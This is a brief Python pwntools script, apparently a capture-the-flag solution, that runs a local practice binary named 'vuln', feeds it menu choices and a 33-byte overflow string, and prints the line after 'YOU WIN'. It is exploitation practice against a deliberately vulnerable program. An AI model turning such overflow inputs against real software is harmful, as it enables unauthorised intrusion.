#!/usr/bin/env python
import pwn


def connect():
    return pwn.process("./vuln")
    # return pwn.connect('127.0.0.1', 1337)


io = connect()
io.sendline(b"2")
io.sendline(b"a" * 33)
io.sendline(b"4")
io.recvuntil(b"YOU WIN\n")


print(io.recvline())
